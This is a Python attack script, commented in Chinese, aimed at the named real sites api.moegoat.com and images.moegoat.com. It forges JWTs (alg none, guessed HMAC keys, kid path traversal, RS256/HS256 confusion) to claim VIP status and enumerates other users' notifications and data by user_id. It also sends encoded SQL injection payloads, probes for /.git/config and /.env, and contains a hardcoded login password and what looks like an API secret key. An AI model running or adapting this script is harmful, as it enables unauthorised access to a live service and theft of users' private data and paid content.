# -*- coding: utf-8 -*-
"""攻击包 v2: JWT 算法混淆 + IDOR 越权 + 二次注入/编码绕过"""

import urllib.request, urllib.parse, json, time, sys, ssl, base64, hmac, hashlib

UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
out = []


def log(s):
    print(s, flush=True)
    out.append(str(s))


def req(method, path, data=None, headers=None, timeout=12):
    h = {
        "User-Agent": UA,
        "Origin": "https://loiship.com",
        "Referer": "https://loiship.com/",
    }
    if headers:
        h.update(headers)
    body = None
    if data is not None:
        body = json.dumps(data).encode()
        h["Content-Type"] = "application/json"
    r = urllib.request.Request(
        "https://api.moegoat.com" + path, data=body, headers=h, method=method
    )
    ctx = ssl.create_default_context()
    try:
        resp = urllib.request.urlopen(r, timeout=timeout, context=ctx)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")[:200]
    except Exception as e:
        return "EXC", type(e).__name__


shard = int(sys.argv[1]) if len(sys.argv) > 1 else 1
res = []


def b64u(b):
    return base64.urlsafe_b64encode(b).decode().rstrip("=")


def make_jwt(alg, payload, key=None):
    h = {"alg": alg, "typ": "JWT"}
    p1 = b64u(json.dumps(h, separators=(",", ":")).encode())
    p2 = b64u(json.dumps(payload, separators=(",", ":")).encode())
    if alg == "none":
        return p1 + "." + p2 + "."
    if key:
        sig = hmac.new(key.encode(), (p1 + "." + p2).encode(), hashlib.sha256).digest()
        return p1 + "." + p2 + "." + b64u(sig)
    return p1 + "." + p2 + ".x"


# 1. JWT 算法混淆攻击
log("=== JWT 攻击 ===")
vip_payload = {
    "sub": 686285,
    "role": "user",
    "vip_id": 4,
    "vip_level": 4,
    "svip": 1,
    "expiry_at": "2099-01-01 00:00:00",
}
keys = [
    "secret",
    "loivip.com",
    "moegoat",
    "loibus",
    "123456",
    "password",
    "loibus-sec-decoy-salt-v1",
    "loibus-web-request-id-v1",
    "loiship",
    "sk-4fugxKBcZcnHptd6LJrJcBaRQv8UXwBLXW7diPie6tVuMb5PbU4LZF2lQxIIPkG7",
]
jwts = [("none", make_jwt("none", vip_payload))]
for k in keys:
    jwts.append(("HS256:" + k[:12], make_jwt("HS256", vip_payload, k)))
# kid 注入
jwts.append(
    (
        "kid-path",
        b64u(b'{"alg":"HS256","typ":"JWT","kid":"../../../../etc/passwd"}')
        + "."
        + b64u(json.dumps(vip_payload).encode())
        + ".x",
    )
)
jwts.append(
    (
        "kid-null",
        b64u(b'{"alg":"HS256","typ":"JWT","kid":null}')
        + "."
        + b64u(json.dumps(vip_payload).encode())
        + ".x",
    )
)
# 算法混淆: 用 JS 里的 RSA 公钥作为 HS256 密钥
PUB_MOD = "wixnV3eKf2lGwraEJs0j0WVKRuv3iWz8sGaT/thwXyroRgKfTctjqinI1Kc+hn+TMhsUrnnJHbS8M9KZqK7QIDAQAB"
PUB_PEM = (
    "-----BEGIN PUBLIC KEY-----\nMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA"
    + PUB_MOD
    + "\n-----END PUBLIC KEY-----"
)
jwts.append(("confuse-pem", make_jwt("HS256", vip_payload, PUB_PEM)))
jwts.append(("confuse-mod", make_jwt("HS256", vip_payload, PUB_MOD)))
jwts.append(
    (
        "confuse-rs256",
        b64u(b'{"alg":"RS256","typ":"JWT"}')
        + "."
        + b64u(json.dumps(vip_payload).encode())
        + ".x",
    )
)
for name, t in jwts:
    st, b = req(
        "GET",
        "/api/user/loi/online_play_v2/6422",
        headers={"Authorization": "Bearer " + t},
    )
    res.append({"t": "jwt-" + name, "s": st, "b": b[:200]})
    log("jwt %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

# 2. IDOR 越权
log("=== IDOR ===")
st, body = req(
    "POST", "/api/user/login", {"email": "3124323585@qq.com", "password": "9876543210."}
)
tok = ""
if st == 200:
    tok = (json.loads(body).get("access_token") or "").replace("bearer ", "")
H = {"Authorization": "Bearer " + tok}
time.sleep(1)
idor_tests = [
    ("GET", "/api/user/info?user_id=1", H),
    ("GET", "/api/user/info?user_id=2", H),
    ("GET", "/api/user/mydownloaded?user_id=1", H),
    ("GET", "/api/user/mydownloaded?user_id=2", H),
    ("GET", "/api/user/mylikes?user_id=1", H),
    ("GET", "/api/user/notifications?user_id=1", H),
    ("GET", "/api/comment/1?page=1", H),
    ("GET", "/api/comment/2?page=1", H),
    ("GET", "/api/user/loi/download_v6/6422?user_id=1", H),
    ("GET", "/api/user/subscribed/list?user_id=1", H),
]
for method, path, hdrs in idor_tests:
    st, b = req(method, path, headers=hdrs)
    res.append({"t": "idor-" + path, "s": st, "b": b[:250]})
    log("idor %s: %s %s" % (path[:50], st, b[:90].replace("\n", " ")))
    time.sleep(0.4)

# 2b. IDOR 通知越权深挖 (user_id 枚举)
log("=== 通知越权 ===")
for uid in [1, 2, 3, 5, 10, 100, 1000, 686285, 236238]:
    st, b = req("GET", "/api/user/notifications?user_id=%d" % uid, headers=H)
    res.append({"t": "notif-%d" % uid, "s": st, "b": b[:400]})
    log("notif uid=%d: %s %s" % (uid, st, b[:130].replace("\n", " ")))
    time.sleep(0.4)

# 2c. 历史/其他用户接口
log("=== 历史/杂项 ===")
misc_tests = [
    ("GET", "/api/user/history?page=1", H),
    ("GET", "/api/user/history", H),
    ("POST", "/api/user/history", {}),
    ("GET", "/api/user/oldUserCheck", H),
    ("GET", "/api/user/mylikes?page=1", H),
    ("GET", "/api/user/loi/like/6422", H),
    ("POST", "/api/user/loi/like", {"loi_id": 6422}),
    ("GET", "/api/user/mydownloaded?page=1", H),
    ("GET", "/api/user/subscribed/list?page=1", H),
    ("GET", "/api/user/category/info/1", H),
    ("GET", "/api/user/tag/info/1", H),
]
for method, path, hdrs in misc_tests:
    st, b = req(method, path, headers=hdrs)
    res.append({"t": "misc-" + path[:40], "s": st, "b": b[:300]})
    log("misc %s: %s %s" % (path[:45], st, b[:110].replace("\n", " ")))
    time.sleep(0.4)

# 2d. 字段投影攻击 (include/fields 尝试返回视频字段)
log("=== 字段投影 ===")
proj_urls = [
    "/api/lois/6422?include=video",
    "/api/lois/6422?include=video_url",
    "/api/lois/6422?with=video",
    "/api/lois/6422?fields=video,images",
    "/api/lois/6422?expand=video",
    "/api/lois/6422?embed=video",
    "/api/lois?page=1&include=video",
    "/api/lois?page=1&with=video_url",
    "/api/user/loi/download_v6/6422?include=url",
    "/api/user/loi/online_play_v2/6422?include=video",
    "/api/lois/6422?include[]=video",
    "/api/lois/6422?select=*",
]
for path in proj_urls:
    st, b = req("GET", path, headers=H)
    got_video = "video" in b.lower() and "60001" not in b
    res.append({"t": "proj-" + path[:50], "s": st, "b": b[:300]})
    log(
        "proj %s: %s %s%s"
        % (path[:55], st, b[:100].replace("\n", " "), " <<<VIDEO!" if got_video else "")
    )
    time.sleep(0.4)

# 3. 二次注入/编码绕过
log("=== 编码注入 ===")
enc_tests = [
    ("/api/lois/6422%2527", "double-quote"),
    ("/api/lois/%36%34%32%32", "hex"),
    ("/api/lois/6422%00", "null"),
    ("/api/lois/6422%20OR%201=1", "space-or"),
    ("/api/lois/6422%09", "tab"),
    ("/api/lois?page=%31%27", "enc-page-quote"),
    (
        "/api/lois?page=1%20UNION%20ALL%20SELECT%20NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--",
        "union-null",
    ),
    ("/api/lois?page=1%20AND%20(SELECT%201%20FROM%20users%20LIMIT%201)=1", "subquery"),
    ("/api/lois?sort=IF(1=1,id,title)", "func-inject"),
    ("/api/lois?sort=json_extract(1,1)", "json-func"),
    ("/api/lois?page=1&order=id%20DESC%20LIMIT%201", "order-limit"),
]
for path, name in enc_tests:
    st, b = req("GET", path, headers=H)
    res.append({"t": "enc-" + name, "s": st, "b": b[:250]})
    log("enc %s: %s %s" % (name, st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

# 4. 未鉴权端点扫描
log("=== 匿名端点 ===")
anon_tests = [
    ("GET", "/api/lois/6422"),
    ("GET", "/api/sp_list"),
    ("GET", "/api/comment/6422?page=1"),
    ("GET", "/api/lois?page=1&sort=new"),
    ("GET", "/api/user/info"),
    ("GET", "/api/tags"),
    ("GET", "/api/categories"),
    ("GET", "/api/site-info"),
    ("GET", "/api/config"),
]
for method, path in anon_tests:
    st, b = req(method, path)
    res.append({"t": "anon-" + path, "s": st, "b": b[:250]})
    log("anon %s: %s %s" % (path[:45], st, b[:80].replace("\n", " ")))
    time.sleep(0.4)

# 5. images.moegoat.com 路径枚举
log("=== images 枚举 ===")
img_paths = [
    "/",
    "/robots.txt",
    "/.git/config",
    "/.env",
    "/upload/",
    "/uploads/",
    "/video/",
    "/videos/",
    "/media/",
    "/storage/",
    "/files/",
    "/download/",
    "/img/",
    "/images/",
    "/video/1.mp4",
    "/videos/1.mp4",
    "/list",
    "/index.json",
]
for pp in img_paths:
    url = "https://images.moegoat.com" + pp
    try:
        rq = urllib.request.Request(
            url, headers={"User-Agent": UA, "Referer": "https://loiship.com/"}
        )
        resp = urllib.request.urlopen(
            rq, timeout=10, context=ssl.create_default_context()
        )
        data = resp.read(64)
        res.append({"t": "img-" + pp, "s": resp.status, "b": data[:40].hex()})
        log("img %s: %s %s" % (pp, resp.status, data[:8].hex()))
    except urllib.error.HTTPError as e:
        res.append({"t": "img-" + pp, "s": e.code, "b": ""})
        log("img %s: %s" % (pp, e.code))
    except Exception as e:
        res.append({"t": "img-" + pp, "s": "EXC", "b": type(e).__name__})
        log("img %s: EXC %s" % (pp, type(e).__name__))
    time.sleep(0.3)
try:
    url = "https://images.moegoat.com/HffjWfqcYwQMXlWaFidl3BkFPVwO3TS6pfadK6ST.jpg"
    rq = urllib.request.Request(url, headers={"User-Agent": UA})
    resp = urllib.request.urlopen(rq, timeout=10, context=ssl.create_default_context())
    res.append({"t": "img-noref", "s": resp.status, "b": ""})
    log("img noreferer: %s" % resp.status)
except urllib.error.HTTPError as e:
    res.append({"t": "img-noref", "s": e.code, "b": ""})
    log("img noreferer: %s" % e.code)

with open("sqli2_%d.jsonl" % shard, "w", encoding="utf-8") as f:
    for r in res:
        f.write(json.dumps(r, ensure_ascii=False) + "\n")
with open("sqli2_%d.txt" % shard, "w", encoding="utf-8") as f:
    f.write("\n".join(out))
log("v2 shard%d done" % shard)
